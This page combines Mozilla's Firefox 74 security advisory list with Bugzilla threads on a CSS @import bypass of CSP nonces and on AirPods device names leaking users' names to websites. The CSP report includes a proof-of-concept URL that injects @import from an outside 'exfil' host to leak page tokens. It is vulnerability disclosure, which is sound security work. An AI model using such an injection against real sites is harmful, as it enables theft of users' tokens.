* Firefox 74

#### [#CVE-2020-6805: Use-after-free when removing data about origins](#CVE-2020-6805)

Reporter
Brian Carpenter
Impact
high
##### Description

When removing data about an origin whose tab was recently closed, a use-after-free could occur in the Quota manager, resulting in a potentially exploitable crash.

##### References

* [Bug 1610880](https://bugzilla.mozilla.org/show_bug.cgi?id=1610880)

#### [#CVE-2020-6806: BodyStream::OnInputStreamReady was missing protections against state confusion](#CVE-2020-6806)

Reporter
Sergei Glazunov of Google Project Zero
Impact
high
##### Description

By carefully crafting promise resolutions, it was possible to cause an out-of-bounds read off the end of an array resized during script execution. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1612308](https://bugzilla.mozilla.org/show_bug.cgi?id=1612308)

#### [#CVE-2020-6807: Use-after-free in cubeb during stream destruction](#CVE-2020-6807)

Reporter
C.M.Chang
Impact
high
##### Description

When a device was changed while a stream was about to be destroyed, the `stream-reinit` task may have been executed after the stream was destroyed, causing a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1614971](https://bugzilla.mozilla.org/show_bug.cgi?id=1614971)

#### [#CVE-2020-6808: URL Spoofing via javascript: URL](#CVE-2020-6808)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

When a JavaScript URL (javascript:) is evaluated and the result is a string, this string is parsed to create an HTML document, which is then presented. Previously, this document's URL (as reported by the document.location property, for example) was the originating javascript: URL which could lead to spoofing attacks; it is now correctly the URL of the originating document.

* [Bug 1247968](https://bugzilla.mozilla.org/show_bug.cgi?id=1247968)

#### [#CVE-2020-6809: Web Extensions with the all-urls permission could access local files](#CVE-2020-6809)

Reporter
Jan Biniok
Impact
moderate
##### Description

When a Web Extension had the all-urls permission and made a fetch request with a mode set to 'same-origin', it was possible for the Web Extension to read local files.

* [Bug 1420296](https://bugzilla.mozilla.org/show_bug.cgi?id=1420296)

#### [#CVE-2020-6810: Focusing a popup while in fullscreen could have obscured the fullscreen notification](#CVE-2020-6810)

Reporter
Avi Drissman of the Chrome security team
Impact
moderate
##### Description

After a website had entered fullscreen mode, it could have used a previously opened popup to obscure the notification that indicates the browser is in fullscreen mode. Combined with spoofing the browser chrome, this could have led to confusing the user about the current origin of the page and credential theft or other attacks.

* [Bug 1432856](https://bugzilla.mozilla.org/show_bug.cgi?id=1432856)

#### [#CVE-2020-6811: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-6811)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as Curl' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.

* [Bug 1607742](https://bugzilla.mozilla.org/show_bug.cgi?id=1607742)

#### [#CVE-2019-20503: Out of bounds reads in sctp\_load\_addresses\_from\_init](#CVE-2019-20503)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
moderate
##### Description

The inputs to `sctp_load_addresses_from_init` are verified by `sctp_arethere_unrecognized_parameters`; however, the two functions handled parameter bounds differently, resulting in out of bounds reads when parameters are partially outside a chunk.

* [Bug 1613765](https://bugzilla.mozilla.org/show_bug.cgi?id=1613765)

#### [#CVE-2020-6812: The names of AirPods with personally identifiable information were exposed to websites with camera or microphone permission](#CVE-2020-6812)

Reporter
Jan-Ivar Bruaroey
Impact
moderate
##### Description

The first time AirPods are connected to an iPhone, they become named after the user's name by default (e.g. Jane Doe's AirPods.) Websites with camera or microphone permission are able to enumerate device names, disclosing the user's name. To resolve this issue, Firefox added a special case that renames devices containing the substring 'AirPods' to simply 'AirPods'.

* [Bug 1616661](https://bugzilla.mozilla.org/show_bug.cgi?id=1616661)

#### [#CVE-2020-6813: @import statements in CSS could bypass the Content Security Policy nonce feature](#CVE-2020-6813)

Reporter
Matheus Vrech
Impact
low
##### Description

When protecting CSS blocks with the nonce feature of Content Security Policy, the @import statement in the CSS block could allow an attacker to inject arbitrary styles, bypassing the intent of the Content Security Policy.

#### [#CVE-2020-6814: Memory safety bugs fixed in Firefox 74 and Firefox ESR 68.6](#CVE-2020-6814)

Reporter
Mozilla developers
Impact
high
##### Description

Mozilla developers Byron Campen, Jason Kratzer, and Christian Holler reported memory safety bugs present in Firefox 73 and Firefox ESR 68.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### Description

Mozilla developers Jason Kratzer, Boris Zbarsky, Tyson Smith, and Alexandru Michis reported memory safety and script safety bugs present in Firefox 73. Some of these bugs showed evidence of memory corruption or escalation of privilege and we presume that with enough effort some of these could have been exploited to run arbitrary code.

When user is able to inject CSS in some page protected by CSP nonce, firefox won't block @import requests making possible to leak sensitive content data.

Mozilla Developer Network documentation (<https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src>

) says: "You can use a nonce-source to only allow specific inline style blocks"

So it seems that page should block intead of load arbitrary styles, as chrome does.

PoC:

To demonstrate this bug I wrote a web page that receives CSS from a parameter 'css' and insert it into a nonced style in page: [http://abrasax.club/csp/css/?css=body{background-color:%20blue;}](http://abrasax.club/csp/css/?css=body%7Bbackground-color:%20blue;%7D)

the CSP defined by this page is: Content-Security-Policy: default-src 'self'; style-src 'nonce-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'; img-src data: http: https:; font-src data: http https

When some user abuse include @import tag the external content is included without get blocked by firefox: <http://abrasax.club/csp/css/?css=@import%20url(https://l4t.cc/exfil/a.css)>;

when the same url is displayed in chrome it gets blocked, even if the source content becomes from the same domain: <http://abrasax.club/csp/css/?css=@import%20url(./b.css)>;

So it becomes possible to abuse the load of @import exfiltrate leak page information, like tokens that didn't change in every request, small token's that reload for each request and for bigger tokens that reload for each refresh (using @import tehcnique: [https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b](https://medium.com/%40d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) or using font technique: <https://twitter.com/terjanq/status/1180477124861407234>)

I also sent 2 videos in attachments showing attack examples.

:emilio this looks like we are capturing the element's nonce whenever we load a child sheet, can you confirm if we are able to remove this behaviour when loading like this?

So, just to confirm my understanding of the patch...

Before your patch, when you call `LoadChildSheet`, we look at the owner node of the topmost stylesheet [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/layout/style/Loader.cpp#2161). That should be the `<style>` element. Then we get to `CheckContentSecurityPolicy` with `aIsPreload=No`, so we check the `nonce` attribute and call SetCspNonce before checking CSP, which passes and thus we load the `@import`.

Your patch makes us not grab the nonce attribute, so that it fails the CSP check. Right?

So it seems reasonable to me off-hand. But we're still passing the `<style>` element down for other CSP checks. Is that what we want? Another alternative would be to just don't do the "walk-the-parent to find the owner node" thing. What other checks is the requesting node needed for in child sheets?

Also there's another `SetCspNonce` call, shouldn't it behave the same? Though I think it's only for sync loads.

Another thing... We seem to be checking the `nonce` attribute even for non-inline stylesheets more generally (so for `<link>` and such)... is that expected?

Depending on the answers above, it may be a better approach to just change `HTMLStyleElement::GetStyleSheetInfo` to thread the `nonce` attribute value down like we do for the `integrity` attribute on `<link>` and such.

Yep this is all my understanding also :).

> So it seems reasonable to me off-hand. But we're still passing the `<style>` element down for other CSP checks. Is that what we want? Another alternative would be to just don't do the "walk-the-parent to find the owner node" thing. What other checks is the requesting node needed for in child sheets?

I think we still want the `loadingPrincipal` for this load otherwise we would skip the checks altogether too (I'd like to harden CheckContentPolicy to require a loadingPrincipal as a follow up to this).

I think we also want the node put into the LoadInfo otherwise we won't have a CSP for the document if I understand that code correctly: <https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/netwerk/base/LoadInfo.cpp#1535>

> Also there's another `SetCspNonce` call, shouldn't it behave the same? Though I think it's only for sync loads.

There are two within LoadSheet my understanding is they don't suffer from the child sheets issue.

I think this is how this worked prior to <https://bugzilla.mozilla.org/show_bug.cgi?id=1509738> but I might not be understanding correctly (I think this bug is the regressor however haven't checked).

You would get the `loadingPrincipal` anyway from the document, right?

Same, if you don't pass the `<style>` element you get [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/layout/style/Loader.cpp#2163) and get the document, right?

Sure, but then `CaptureNonce` should be more explicit.

That is totally not how it worked? I don't see any code in `HTMLStyleElement.cpp` being removed there :-)

It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |

AirPods seem to become named after their user by default e.g. "Jane Doe’s AirPods" the first time they're connected. Users can change this, if they know how. Most probably don't.

Firefox exposes this to web sites with camera or microphone permission.

This seems like an unintended privacy violation, since nowhere is it apparent to users that device labels are shared with web sites.

STRs:

1. (Make sure AirPods are connected to your laptop and) open <https://jsfiddle.net/jib1/LbtxeLvw/>
2. Click `Start Camera!` button and hit "Allow" in the permission prompt (you don't have to choose AirPods here).
3. Click `Enumerate Devices!` button.

Actual result:

```
...
audioinput: Jan-Ivar Bruaroey’s AirPods
...

```

Expected result: Don't share my full name with web page.

**Additionally:** if you chose the airpods, you'll see the following as well from `track.label`:

```
Microphone (live): Jan-Ivar Bruaroey’s AirPods

```

I thought we exposed a generic device ID for everything? Preferably device IDs that change over time. The information is a fingerprinting problem even before we start leaking personal names on apple devices here!

This issue is about [label](https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediadeviceinfo-label) ([2](https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediastreamtrack-label)), not [deviceId](https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediadeviceinfo-deviceid). Labels get exposed to sites with cam/mic permission to let them implement *in-content device selection*. I've been championing an [alternative](https://docs.google.com/presentation/d/1zhbRBbxVAlwVzqU7j5SIYKoLRc6Ec-brcDhNcfAI1sU/edit?ts=5e13b393#slide=id.g7c3d2d4d1e_7_2) to this, which I'll be speaking more about [next week](https://docs.google.com/presentation/d/1NIHzumglY9cYa4b7rcEbHGVsMam5BiY80VfFDB6cDjQ/edit?ts=5e2b3630#slide=id.p), so I'm happy to take input.

(In reply to Daniel Veditz [:dveditz] from [comment #3](/show_bug.cgi?id=1616661#c3 "VERIFIED FIXED - AirPods labels with personally identifiable information should not be exposed to the web"))

deviceIds are unique to the origin. There's a [long discussion on public-webrtc](https://lists.w3.org/Archives/Public/public-privacy/2019OctDec/0011.html) about whether deviceId poses any fingerprinting risk above local storage except when mis-partitioned with local storage ([bug 1589685](/show_bug.cgi?id=1589685 "NEW - Use StoragePrincipal for deviceId (and potentially QuotaManager if not used)")).

> <https://browserleaks.com/webrtc>

We have [bug 1528042](/show_bug.cgi?id=1528042 "RESOLVED FIXED - Make enumerateDevices() more private ahead of getUserMedia() grant befind pref") about reigning in deviceId without permission for the sake of appearances (sites without permission see them rotate on process shutdown—would have been more frequently with [bug 1223773](/show_bug.cgi?id=1223773 "RESOLVED DUPLICATE - Limit pre-grant deviceIds to [BROWSINGCONTEXT]") but I didn't get consensus for that). They're cleared with cookies. We could do a better job of making them less invisible. But let's keep this issue about labels.

The fix is aimed at AirPods. But we only look at the name of the device, so if you have a (e.g. bluetooth) device that lets you configure its name, it should let you test it:

* Rename device to e.g. *"Jane Doe’s AirPods"* and verify it shows as such in the Firefox prompt, but only as "AirPods" in JS output per [comment 2](/show_bug.cgi?id=1616661#c2 "VERIFIED FIXED - AirPods labels with personally identifiable information should not be exposed to the web").
* Any other name that does not include "AirPods" should remain unaffected.

Odd it doesn't compile there. AFAICT `const RefPtr<MediaEngineWebRTCAudioCaptureSource>&` and `const RefPtr<MediaDevice>&` are unrelated types. A compiler bug perhaps?

I have reproduced this behavior on Mac OS 10.14.6 with Nightly v75.0a1 from 2020-02-20 using A Platronics headset to which I changed the name to "John Doe's AirPods". The entire name gets displayed in the JS output (Enumerate devices action). I have verified the fix in Mac OS 10.14.6 with Nightly v75.0a1 from 2020-03-03, Beta v74.0b9 and ESR v68.6esr (candidate). Unfortunately, it cannot be verified on Windows and Ubuntu OSes with non-AirPods device because the device's name cannot be changed to "SOME Name's AirPods" or any other for that matter.
